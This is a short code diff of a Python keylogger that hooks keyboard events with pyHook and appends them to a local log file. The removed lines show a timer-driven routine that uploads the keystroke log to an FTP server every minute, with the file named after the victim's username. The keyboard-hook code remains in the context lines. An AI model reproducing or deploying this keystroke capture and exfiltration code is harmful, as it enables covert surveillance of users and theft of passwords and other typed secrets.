@@ -1,22 +1,9 @@
 import pyHook
 import pythoncom
-import threading
-from network.ftpconn import upload_to_ftp
-import os
 
 G_File = open('log.txt','a')
 G_File.close()
-
-MACHINE_NAME = os.getenv('username')
-
-filename = MACHINE_NAME + '_log.txt'
-
-print("Got file name")
-def log_to_ftp():
-    global filename
-    upload_to_ftp('log.txt',filename,'rb')
-    threading.Timer(60,log_to_ftp).start()
-
+    
 
 def OnKeyboardEvent(event):
     print("Got event")
@@ -36,4 +23,4 @@ def gethookready():
     pythoncom.PumpMessages()
     print("done....")
 
-threading.Timer(1,gethookready).start()
+
